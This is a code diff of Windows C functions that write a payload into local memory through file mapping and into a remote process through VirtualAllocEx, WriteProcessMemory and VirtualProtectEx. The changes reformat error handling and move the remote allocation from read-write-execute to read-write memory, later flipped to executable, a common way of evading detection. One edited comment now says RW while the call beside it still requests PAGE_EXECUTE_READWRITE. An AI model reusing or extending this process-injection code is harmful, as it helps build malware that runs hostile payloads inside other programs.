@@ -9,12 +9,13 @@ BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize,
 	PVOID		pMapAddress		= NULL;
 
 
-	// create a file mapping handle with `RWX` memory permissions
-	// this doesnt have to allocated `RWX` view of file unless it is specified in the MapViewOfFile call  
+	// create a file mapping handle with `RW` memory permissions
+	// this doesnt have to allocated `RW` view of file unless it is specified in the MapViewOfFile call  
 	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
 	if (hFile == NULL) {
 		DebugPrint("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	// maps the view of the payload to the memory 
@@ -23,7 +24,8 @@ BOOL  WritePayloadViaLocalFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize,
 	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sPayloadSize);
 	if (pMapAddress == NULL) {
 		DebugPrint("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 	
 
@@ -56,7 +58,8 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
 	if (hFile == NULL) {
 		DebugPrint("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	// maps the view of the payload to the memory 
@@ -65,7 +68,8 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
 	if (pMapLocalAddress == NULL) {
 		DebugPrint("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 
@@ -79,14 +83,16 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sPayloadSize, NULL);
 	if (hFile == NULL) {
 		DebugPrint("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	// Map the view into the local process
 	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sPayloadSize);
 	if (pMapLocalAddress == NULL) {
 		DebugPrint("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	DebugPrint("[i] Local Mapping Address : 0x%p \n", pMapLocalAddress);
@@ -97,10 +103,11 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	DebugPrint("[+] DONE \n");
 
 	// Allocate memory in the remote process
-	pMapRemoteAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	pMapRemoteAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (pMapRemoteAddress == NULL) {
 		DebugPrint("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	DebugPrint("[i] Remote Allocation Address : 0x%p \n", pMapRemoteAddress);
@@ -109,7 +116,8 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	SIZE_T bytesWritten = 0;
 	if (!WriteProcessMemory(hProcess, pMapRemoteAddress, pMapLocalAddress, sPayloadSize, &bytesWritten) || bytesWritten != sPayloadSize) {
 		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	DebugPrint("[+] Payload Written To Remote Process At 0x%p \n", pMapRemoteAddress);
@@ -118,7 +126,8 @@ BOOL  WritePayloadViaRemoteFileMapping(IN PBYTE pPayload, IN SIZE_T sPayloadSize
 	DWORD oldProtect;
 	if (!VirtualProtectEx(hProcess, pMapRemoteAddress, sPayloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
 		DebugPrint("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
-		bSTATE = FALSE; goto _EndOfFunction;
+		bSTATE = FALSE; 
+		goto _EndOfFunction;
 	}
 
 	DebugPrint("[+] Remote Memory Permissions Changed To PAGE_EXECUTE_READ \n");
